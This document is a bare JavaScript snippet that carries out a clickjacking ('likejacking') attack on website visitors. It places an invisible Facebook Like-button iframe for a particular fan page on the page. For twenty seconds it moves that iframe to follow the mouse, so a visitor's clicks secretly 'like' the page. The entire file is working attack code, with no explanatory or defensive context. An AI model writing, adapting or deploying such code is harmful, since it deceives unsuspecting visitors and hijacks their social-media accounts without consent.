<script>
var fan_page_url = 'http://www.facebook.com/linuxs3c';
var opacity = 0.0;
var time = 20000;
if((document.getElementById) && window.addEventListener || window.attachEvent){
(function(){
var hairCol = "‪#‎ff0000‬";
var d = document;
var my = -10;
var mx = -10;
var r;
var vert = "";
var idx = document.getElementsByTagName('div').length;
var thehairs = "<iframe id='theiframe' scrolling='no' frameBorder='0' allowTransparency='true' src='http://web.facebook.com/widgets/like.php?href" + encodeURIComponent(fan_page_url) + "&amp;layout=standard&amp;show_faces=true&amp;width=53&amp;action=like&amp;colorscheme=light&amp;height=80' style='position:absolute;width:53px;height:23px;overflow:hidden;border:0;opacity:" + opacity +";filter:alpha(opacity=" + opacity * 100+ ");'></iframe>";
document.write(thehairs);
var like = document.getElementById("theiframe");
document.getElementsByTagName('body')[0].appendChild(like);
var pix = "px";
var domWw = (typeof window.innerWidth == "number");
var domSy = (typeof window.pageYOffset == "number");
if (domWw)
r = window;
else{
if (d.documentElement && typeof d.documentElement.clientWidth == "number" && d.documentElement.clientWidth != 0)
r = d.documentElement;
else{
if (d.body && typeof d.body.clientWidth == "number")
r = d.body;
}
}
if(time != 0){
setTimeout(function(){
document.getElementsByTagName('body')[0].removeChild(like);
if (window.addEventListener){
document.removeEventListener("mousemove",mouse,false);
}
else if (window.attachEvent){
document.detachEvent("onmousemove",mouse);
}
}, time);
}
function scrl(yx){
var y,x;
if (domSy){
y = r.pageYOffset;
x = r.pageXOffset;
}
else{
y = r.scrollTop;
x = r.scrollLeft;
}
return (yx == 0) ? y:x;
}
function mouse(e){
var msy = (domSy)?window.pageYOffset:0;
if (!e)
e = window.event;
if (typeof e.pageY == 'number'){
my = e.pageY - 5 - msy;
mx = e.pageX - 4;
}
else{
my = e.clientY - 6 - msy;
mx = e.clientX - 6;
}
vert.top = my + scrl(0) + pix;
vert.left = mx + pix;
}
function ani(){
vert.top = my + scrl(0) + pix;
setTimeout(ani, 300);
}
function init(){
vert = document.getElementById("theiframe").style;
ani();
}
if (window.addEventListener){
window.addEventListener("load",init,false);
document.addEventListener("mousemove",mouse,false);
}
else if (window.attachEvent){
window.attachEvent("onload",init);
document.attachEvent("onmousemove",mouse);
}
})();
}//End.
</script>
